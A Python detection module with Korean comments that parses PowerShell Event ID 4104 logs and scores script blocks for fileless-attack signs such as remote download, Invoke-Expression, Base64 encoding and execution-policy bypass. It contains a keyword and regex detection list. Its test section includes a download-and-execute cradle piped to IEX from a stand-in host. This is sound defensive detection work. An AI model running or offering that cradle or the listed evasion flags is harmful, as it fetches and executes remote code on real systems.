"""
fileless_detector.py
────────────────────
PowerShell Script Block Logging(Event ID 4104) 기반 Fileless 행위 탐지 모듈

핵심 기능
- Event ID 4104에서 마지막 RecordId 이후의 새 로그만 수집
- 키워드, 인코딩, Base64, 난독화, 숨김/우회 실행 행위 분석
- 위험한 4104만 EDR 수집기로 전달
- RecordId / ProcessId를 함께 전달하여 Sysmon 1/3/5/22와 연계 가능
"""

import base64
import json
import re
import subprocess
from typing import Dict, List

try:
    import psutil
except ImportError:
    psutil = None

try:
    import win32gui
    import win32process
except ImportError:
    win32gui = None
    win32process = None


POWERSHELL_CHANNEL = "Microsoft-Windows-PowerShell/Operational"


# ======================================================================
# 1. 의심 PowerShell 패턴 정의
# ======================================================================

SUSPICIOUS_KEYWORDS = {
    "DownloadString": {"risk": "H", "desc": "원격 파일 다운로드"},
    "DownloadFile": {"risk": "H", "desc": "원격 파일 다운로드"},
    "IEX": {"risk": "H", "desc": "동적 코드 실행 (Invoke-Expression 별칭)"},
    "Invoke-Expression": {"risk": "H", "desc": "동적 코드 실행"},
    "Invoke-WebRequest": {"risk": "M", "desc": "웹 요청 수행"},
    "Invoke-RestMethod": {"risk": "M", "desc": "REST 요청 수행"},
    "New-Object": {"risk": "M", "desc": "객체 생성"},
    "WScript.Shell": {"risk": "H", "desc": "Windows 스크립트 호스트 호출"},
    "System.Net.WebClient": {"risk": "H", "desc": "원격 연결 시도"},
    "-NoProfile": {"risk": "M", "desc": "PowerShell 프로필 우회"},
    "-Hidden": {"risk": "M", "desc": "숨겨진 실행"},
    "-NoExit": {"risk": "M", "desc": "종료 방지"},
    "-WindowStyle": {"risk": "M", "desc": "윈도우 스타일 조작"},
    "-ExecutionPolicy Bypass": {"risk": "H", "desc": "실행 정책 우회"},
    "cmd /c": {"risk": "M", "desc": "명령 프롬프트 체이닝"},
    "-EncodedCommand": {"risk": "H", "desc": "인코딩된 명령"},
    "FromBase64String": {"risk": "H", "desc": "Base64 디코딩"},
    "Reflection": {"risk": "H", "desc": "리플렉션을 통한 메모리 접근"},
    "Assembly]::Load": {"risk": "H", "desc": "메모리 내 .NET 어셈블리 로드"},
    "[Byte]": {"risk": "M", "desc": "바이트 배열 사용"},
    "ToString": {"risk": "M", "desc": "문자열 변환"},
    "Replace": {"risk": "M", "desc": "문자열 대체/난독화 가능성"},
    "$env": {"risk": "L", "desc": "환경 변수 접근"},
}


OBFUSCATION_PATTERNS = {
    r"powershell(?:\.exe)?\s+.*-(?:e|en|enc|enco|encodedcommand)\s+": "인코딩된 PowerShell 명령",
    r"\[system\.text\.encoding\].*::": "텍스트 인코딩 API 사용",
    r"\[convert\]::frombase64string": "Base64 디코딩 API 사용",
    r"\$\{[^}]+\}": "변수 보간/분할 사용",
    r"['\"]\s*\+\s*['\"]": "문자열 분할 결합",
    r"\-join\s+": "문자열 Join 난독화",
    r"\[char\]\s*\d+": "문자 코드 기반 문자열 구성",
}


# ======================================================================
# 2. PowerShell Event ID 4104 수집
# ======================================================================


def collect_powershell_events(
    last_record_id: int = 0,
    max_records: int = 500,
) -> List[Dict]:
    """
    마지막으로 처리한 EventRecordID보다 큰 Event ID 4104만 오래된 순으로 수집한다.
    """

    try:
        last_record_id = int(last_record_id or 0)
    except Exception:
        last_record_id = 0

    try:
        max_records = max(1, int(max_records or 500))
    except Exception:
        max_records = 500

    ps_script = r"""
$xpath = "*[System[
    (EventID=4104)
    and
    (EventRecordID > %d)
]]"

$events = Get-WinEvent `
    -LogName '%s' `
    -FilterXPath $xpath `
    -Oldest `
    -MaxEvents %d `
    -ErrorAction SilentlyContinue

$result = @()
foreach ($e in $events) {
    $result += [PSCustomObject]@{
        EventID      = $e.Id
        RecordId     = $e.RecordId
        TimeCreated  = $e.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")
        ComputerName = $e.MachineName
        ProcessId    = $e.ProcessId
        Message      = $e.Message
    }
}

$result | ConvertTo-Json -Depth 5
""" % (
        last_record_id,
        POWERSHELL_CHANNEL,
        max_records,
    )

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=30,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )

        if result.returncode != 0:
            if result.stderr.strip():
                print("[Fileless] PowerShell 이벤트 조회 오류:", result.stderr.strip())
            return []

        output = result.stdout.strip()
        if not output:
            return []

        events = json.loads(output)

        if isinstance(events, dict):
            events = [events]

        if not isinstance(events, list):
            return []

        return events

    except Exception as e:
        print(f"[Fileless] PowerShell 이벤트 수집 오류: {e}")
        return []



def get_latest_powershell_record_id() -> int:
    """현재 PowerShell Operational 로그의 최신 Event ID 4104 RecordId를 반환한다."""

    ps_script = r"""
$e = Get-WinEvent `
    -FilterHashtable @{LogName='%s'; Id=4104} `
    -MaxEvents 1 `
    -ErrorAction SilentlyContinue

if ($null -ne $e) {
    $e.RecordId
}
""" % POWERSHELL_CHANNEL

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=20,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )

        if result.returncode != 0:
            return 0

        value = result.stdout.strip()
        return int(value) if value else 0

    except Exception:
        return 0


# ======================================================================
# 3. 의심 행위 분석
# ======================================================================


def analyze_powershell_command(command: str) -> Dict:
    """PowerShell ScriptBlock 내용을 분석하여 Fileless 행위 위험도를 계산한다."""

    command = str(command or "")
    cmd_lower = command.lower()

    risk_score = 0.0
    detected_keywords = []
    obfuscation_indicators = []
    behavior_categories = set()

    # ----------------------------------------------------------
    # 키워드 기반 행위
    # ----------------------------------------------------------
    for keyword, info in SUSPICIOUS_KEYWORDS.items():
        if keyword.lower() not in cmd_lower:
            continue

        detected_keywords.append(
            {
                "keyword": keyword,
                "risk": info["risk"],
                "description": info["desc"],
            }
        )

        if info["risk"] == "H":
            risk_score += 0.25
        elif info["risk"] == "M":
            risk_score += 0.10
        else:
            risk_score += 0.05

        lowered_keyword = keyword.lower()

        if lowered_keyword in {
            "downloadstring",
            "downloadfile",
            "invoke-webrequest",
            "invoke-restmethod",
            "system.net.webclient",
        }:
            behavior_categories.add("Network/Download")

        if lowered_keyword in {
            "iex",
            "invoke-expression",
            "reflection",
            "assembly]::load",
        }:
            behavior_categories.add("Memory/Dynamic Execution")

        if lowered_keyword in {
            "-encodedcommand",
            "frombase64string",
            "replace",
            "[byte]",
        }:
            behavior_categories.add("Obfuscation/Encoding")

        if lowered_keyword in {
            "-noprofile",
            "-hidden",
            "-windowstyle",
            "-executionpolicy bypass",
        }:
            behavior_categories.add("Hidden/Bypass Execution")

    # ----------------------------------------------------------
    # 난독화 패턴
    # ----------------------------------------------------------
    for pattern, description in OBFUSCATION_PATTERNS.items():
        try:
            matched = re.search(pattern, command, re.IGNORECASE)
        except re.error:
            matched = None

        if matched:
            obfuscation_indicators.append(description)
            behavior_categories.add("Obfuscation/Encoding")
            risk_score += 0.15

    # ----------------------------------------------------------
    # EncodedCommand Base64 내용 확인
    # ----------------------------------------------------------
    encoded_match = re.search(
        r"-(?:e|en|enc|enco|encodedcommand)\s+([A-Za-z0-9+/=]{8,})",
        command,
        re.IGNORECASE,
    )

    if encoded_match:
        encoded = encoded_match.group(1)
        try:
            encoded += "=" * ((4 - len(encoded) % 4) % 4)
            decoded = base64.b64decode(encoded).decode("utf-16-le", errors="ignore")
            obfuscation_indicators.append(
                "EncodedCommand Base64 사용: " + decoded[:120]
            )
            behavior_categories.add("Obfuscation/Encoding")
            risk_score += 0.20
        except Exception:
            obfuscation_indicators.append("EncodedCommand Base64 사용")
            behavior_categories.add("Obfuscation/Encoding")
            risk_score += 0.15

    # ----------------------------------------------------------
    # 복합 행위 보너스
    # ----------------------------------------------------------
    has_download = any(
        value in cmd_lower
        for value in (
            "downloadstring",
            "downloadfile",
            "invoke-webrequest",
            "invoke-restmethod",
            "system.net.webclient",
        )
    )

    has_dynamic_execution = any(
        value in cmd_lower
        for value in (
            "invoke-expression",
            "iex ",
            "iex(",
            "assembly]::load",
            "reflection",
        )
    )

    if has_download and has_dynamic_execution:
        obfuscation_indicators.append("다운로드 후 동적 실행 체인")
        risk_score += 0.25

    if len(behavior_categories) >= 2:
        risk_score += 0.10

    if len(behavior_categories) >= 3:
        risk_score += 0.10

    risk_score = min(risk_score, 1.0)

    if risk_score >= 0.70:
        risk_level = "H"
    elif risk_score >= 0.40:
        risk_level = "M"
    else:
        risk_level = "L"

    is_fileless = risk_score >= 0.40 and bool(
        detected_keywords or obfuscation_indicators
    )

    return {
        "risk_level": risk_level,
        "risk_score": round(risk_score, 2),
        "detected_keywords": detected_keywords,
        "obfuscation_indicators": obfuscation_indicators,
        "behavior_categories": sorted(behavior_categories),
        "is_fileless": is_fileless,
        "description": (
            f"PowerShell 의심 행위: 키워드 {len(detected_keywords)}개, "
            f"난독화/인코딩 {len(obfuscation_indicators)}개, "
            f"행위 유형 {len(behavior_categories)}개"
        ),
    }


# ======================================================================
# 4. 백그라운드 PowerShell 보조 탐지
# ======================================================================


def _get_visible_window_pids() -> set:
    visible_pids = set()

    if win32gui is None or win32process is None:
        return visible_pids

    def enum_window_callback(hwnd, _):
        try:
            if not win32gui.IsWindowVisible(hwnd):
                return

            window_title = win32gui.GetWindowText(hwnd).strip()
            if not window_title:
                return

            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            visible_pids.add(pid)
        except Exception:
            pass

    try:
        win32gui.EnumWindows(enum_window_callback, None)
    except Exception:
        pass

    return visible_pids



def detect_background_powershell() -> List[Dict]:
    """
    화면에 표시되지 않은 powershell.exe / pwsh.exe를 조회한다.
    실시간 4104 통합 수집에는 반복 오탐 방지를 위해 자동 합산하지 않고 보조 기능으로만 둔다.
    """

    if psutil is None:
        return []

    detected_processes = []

    try:
        visible_window_pids = _get_visible_window_pids()

        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                pid = proc.info.get("pid")
                process_name = (proc.info.get("name") or "").lower()

                if process_name not in {"powershell.exe", "pwsh.exe"}:
                    continue

                if pid in visible_window_pids:
                    continue

                command_line = " ".join(proc.info.get("cmdline") or [])

                detected_processes.append(
                    {
                        "ProcessID": pid,
                        "ProcessName": process_name,
                        "CommandLine": command_line,
                    }
                )

            except Exception:
                continue

    except Exception as e:
        print(f"[Fileless] 백그라운드 PowerShell 탐지 오류: {e}")

    return detected_processes


# ======================================================================
# 5. 통합 Fileless 탐지
# ======================================================================


def detect_fileless_threats(
    last_record_id: int = 0,
    max_records: int = 500,
    return_meta: bool = False,
):
    """
    마지막 RecordId 이후 새로 발생한 Event ID 4104를 분석한다.

    return_meta=True:
        (위험 로그 목록, 이번에 확인한 마지막 4104 RecordId)
    """

    threats = []
    ps_events = collect_powershell_events(
        last_record_id=last_record_id,
        max_records=max_records,
    )

    try:
        last_seen_record_id = int(last_record_id or 0)
    except Exception:
        last_seen_record_id = 0

    for event in ps_events:
        try:
            record_id = int(event.get("RecordId", 0) or 0)
        except Exception:
            record_id = 0

        if record_id > last_seen_record_id:
            last_seen_record_id = record_id

        message = str(event.get("Message", "") or "")

        # 수집기가 자체적으로 실행한 Get-WinEvent 스크립트는 분석 대상에서 제외한다.
        message_lower = message.lower()
        if (
            "get-winevent" in message_lower
            and "microsoft-windows-powershell/operational" in message_lower
            and "eventid=4104" in message_lower.replace(" ", "")
        ):
            continue

        analysis = analyze_powershell_command(message)

        if not analysis["is_fileless"]:
            continue

        threat = {
            "threat_type": "Fileless.PowerShell",
            "event_id": 4104,
            "record_id": record_id,
            "process_id": event.get("ProcessId", ""),
            "timestamp": event.get("TimeCreated"),
            "computer_name": event.get("ComputerName"),
            "risk_level": analysis["risk_level"],
            "risk_score": analysis["risk_score"],
            "command_snippet": message[:1000],
            "keywords_detected": analysis["detected_keywords"],
            "obfuscation_flags": analysis["obfuscation_indicators"],
            "behavior_categories": analysis["behavior_categories"],
            "description": analysis["description"],
            "mitre_tactic": "Execution / Defense Evasion",
            "mitre_technique": "T1059.001 PowerShell",
        }

        threats.append(threat)

    if return_meta:
        return threats, last_seen_record_id

    return threats


# ======================================================================
# 6. 단독 테스트
# ======================================================================


if __name__ == "__main__":
    print("=" * 70)
    print("Fileless PowerShell 행위 분석 테스트")
    print("=" * 70)

    test_commands = [
        "Get-Process",
        "Invoke-Expression 'Write-Output TEST'",
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VEVTVA==')) | Invoke-Expression",
        "powershell.exe -EncodedCommand JABhAD0AMQA=",
        "(New-Object Net.WebClient).DownloadString('https://example.com/test.ps1') | IEX",
    ]

    for cmd in test_commands:
        result = analyze_powershell_command(cmd)
        print("\nCommand:", cmd)
        print("Risk:", result["risk_level"], result["risk_score"])
        print("Fileless:", result["is_fileless"])
        print("Behaviors:", result["behavior_categories"])